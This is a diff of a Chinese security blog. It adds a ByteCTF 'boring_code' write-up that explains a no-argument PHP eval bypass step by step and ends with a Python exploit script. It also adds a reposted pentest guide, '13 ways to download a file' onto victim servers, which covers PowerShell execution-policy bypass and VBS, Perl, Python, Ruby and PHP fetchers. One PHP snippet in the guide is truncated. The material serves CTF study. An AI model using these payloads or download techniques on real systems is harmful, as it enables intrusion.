@@ -157,11 +157,94 @@
         <h2 id="Bytectf-boring-code"><a href="#Bytectf-boring-code" class="headerlink" title="Bytectf boring_code"></a>Bytectf boring_code</h2><p>因为 <code>decade</code> 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目</p>
 <p><strong>题目源码</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Bypass 第一层</strong></p>
+<p>第一层关键过滤代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($url, FILTER_VALIDATE_URL)</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/data:\/\//i'</span>, $url)</span><br><span class="line"></span><br><span class="line">parse_url($url)</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>绕过<code>filter_var()</code>和<code>preg_match()</code>函数的文章看这篇： <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
-<p><strong><a href="https://www.w3school.com.cn/php/func_filter_var.asp" target="_blank" rel="noopener">filter_var()</a></strong></p>
-<p><img src alt="4-1"></p>
-<p><a href="https://www.cnblogs.com/gengyi/p/6390084.html" target="_blank" rel="noopener">parse_url</a></p>
-<p><img src alt="4-2"></p>
+<p>但是本题对<code>data://</code>协议做了过滤，所以这个方法就不能用了。本题正确方法如下：</p>
+<blockquote>
+<p>① 氪金，购买一个含有 baidu.com 的域名</p>
+<p>② 使用 ftp 协议： <a href="ftp://ip:port,baidu.com:80/filename.txt" target="_blank" rel="noopener">ftp://ip:port,baidu.com:80/filename.txt</a></p>
+<p>③ 使用一个百度的任意跳转的漏洞，具体可以参考 ：<a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">https://www.4xseo.com/marketing/1280/#title-0</a></p>
+<p>④  compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); </p>
+</blockquote>
+<p><code>$code</code>的值通过<code>file_get_content()</code>函数获取，而它正是<code>eval()</code>的参数，所以我们才要想尽办法绕过第一层把这个 $code 送进去 eval() 函数内</p>
+<p>这一层就不多说了，关键是下一层的骚姿势</p>
+<p><strong>Bypass 第二层</strong></p>
+<p>第二层关键过滤代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先解释一下<code>(?R)?</code>，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</p>
+<p>所以这个正则的意思就是只能使用包含<code>a-z</code>字母加<code>括号()</code>的函数（比如 var_dump() 就不能用了），然后必须无参数</p>
+<p>无参数的意思是：<code>所使用的的函数不得传入参数</code>，比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="string">"999"</span>)</span><br></pre></td></tr></table></figure>
+<p>其中<code>999</code>就是 echo 函数的参数，而在本题中这样是不行的，但是却可以：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(time())</span><br></pre></td></tr></table></figure>
+<p>也就是函数中再嵌套一个函数，这样在本题中确实被允许的，所以就利用这一点</p>
+<p>[+]</p>
+<p>接下来直接看着 payload 来学习，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
+<p>因为题目中给了如下提示</p>
+<blockquote>
+<p>flag in this file and code in /code</p>
+</blockquote>
+<p>也就是说 flag 在<code>/www/</code>目录下，而我们当前的目录是<code>/www/code</code>，所以要切换到上一级并读取 flag</p>
+<p><code>① localeconv()函数</code></p>
+<p>作用：返回一个包含本地数字及货币格式信息的数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(localeconv());</span><br><span class="line"><span class="keyword">array</span>(<span class="number">18</span>) &#123;</span><br><span class="line">  [<span class="string">"decimal_point"</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="string">"thousands_sep"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">  [<span class="string">"int_curr_symbol"</span>]=&gt;</span><br><span class="line">  string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>可以看到，该函数返回的是一个<code>数组</code>，并且数组的第一个元素为字符串的<code>点（.）</code></p>
+<p><code>② pos()函数</code></p>
+<p>作用： 返回数组中的当前元素的值</p>
+<p>因为正则条件中有<code>nt</code>，所以<code>current()</code>函数就无法使用，但是它有一个别名，就是<code>pos()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(pos(localeconv()));</span><br><span class="line">string(<span class="number">1</span>) <span class="string">"."</span></span><br></pre></td></tr></table></figure>
+<p><code>③ scandir()函数</code></p>
+<p>作用： 返回指定目录中的文件和目录的数组</p>
+<p>前面 pos() 函数输出的值为<code>点（.）</code>，所以这里变成<code>scandir(.)</code>，也就是当前目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(pos(localeconv())));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">8</span>) <span class="string">"code.php"</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>④ next()函数</code></p>
+<p>作用： 将数组中的内部指针向前移动一位</p>
+<p>在刚才 scandir() 函数返回的数组中，第一位是点（.），此时指针默认指向该位（也就是第一位），通过<code>next()</code>函数，将指针移动到下一位，也就是<code>点点（..）</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(next(scandir(pos(localeconv()))));</span><br><span class="line">string(<span class="number">2</span>) <span class="string">".."</span></span><br></pre></td></tr></table></figure>
+<p><code>⑤ chdir()函数</code></p>
+<p>作用：改变目录</p>
+<p>next() 函数返回点点（..），<code>chdir()</code>函数执行 chdir(..) 也就把目录切换到了上一级</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(chdir(next(scandir(pos(localeconv())))));</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
+<p>返回 bool 类型的 true ，说明当前目录切换成功</p>
+<p><code>⑥ time()函数</code></p>
+<p>作用：  返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数</p>
+<p>chdir() 函数返回的是 bool 类型的 true ，所以对不需要传入参数的<code>time()</code>函数来说，本来就没有影响，可以正常执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(time(chdir(next(scandir(pos(localeconv()))))));</span><br><span class="line">int(<span class="number">1572952610</span>)</span><br></pre></td></tr></table></figure>
+<p><code>⑦ localtime()函数</code></p>
+<p>作用： 取得本地时间</p>
+<p><code>localtime()函数</code>可以接受参数，并且第一个参数可以直接接受<code>time()</code>，所以直接利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime ([ int $timestamp = time() [, bool $is_associative = <span class="keyword">false</span> ]] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(localtime(time(chdir(next(scandir(pos(localeconv())))))));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">9</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  int(<span class="number">52</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  int(<span class="number">15</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>返回的数组中，第一个参数是当前系统的<code>秒数</code>，0 到 59 </p>
+<p><code>⑧ pos()函数</code></p>
+<p>不多说了，获取第一个参数，也就是系统当前的秒数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))));</span><br><span class="line">int(<span class="number">14</span>)</span><br></pre></td></tr></table></figure>
+<p><code>⑨ chr()函数</code></p>
+<p>作用： 返回相对应于 <code>ascii</code> 所指定的单个字符</p>
+<p><code>chr()</code>函数在这里什么作用呢？因为当秒数为46时，<code>chr(46)=&quot;.&quot;</code>，用来获取<code>点（.）</code>（这里不能再用 localeconv() 函数是因为它不能传入参数）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))));</span><br><span class="line">string(<span class="number">1</span>) <span class="string">"."</span></span><br></pre></td></tr></table></figure>
+<p><code>⑩ scandir()函数</code></p>
+<p>继续扫描当前目录（默认目录得上一级，因为我们刚才已经 chdir(“..”) 切换过）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">      </span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  string(<span class="number">8</span>) <span class="string">"flag.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>①① end()函数</code></p>
+<p>作用： 将 <code>array</code> 的内部指针移动到最后一个单元并返回其值</p>
+<p>scandir() 返回当前目录的数组，<code>end()</code>函数将指针移动到最后一个（这里就是 flag.php ，因为文件名按字母先后排序，而字母 <code>f</code> 在本题中排最后）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br><span class="line">string(<span class="number">8</span>) <span class="string">"flag.php"</span></span><br></pre></td></tr></table></figure>
+<p><code>①② readfile()函数</code></p>
+<p>作用： 读取文件并写入到输出缓冲</p>
+<p>这里将执行<code>readfile(&quot;flag.php&quot;)</code>，将 flag.php 的内容读取出来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line">flag&#123;Byctf_Borning_Code_Test&#125;</span><br><span class="line">int(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
+<p><code>①③ echo()函数</code></p>
+<p>最后用<code>echo()</code>函数将 flag 输出</p>
+<p><strong>本地复现</strong></p>
+<p>这里做一下第二层 Bypass 的复现，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>EXP</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.31.19.207/"</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">"code"</span>:<span class="string">"echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	response = requests.post(url,data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">		print(response.text)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src alt="4-3"></p>
 <h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><blockquote>
 <p>参考 bytectf boring_code</p>
 <p>无参数 RCE</p>
@@ -207,6 +290,7 @@
 <p><strong>Reference</strong></p>
 <p> <a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></p>
 <p> <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
+<p> <a href="https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc</a> </p>
 
       
 
@@ -802,6 +886,160 @@
 
 
   
+    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
+<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
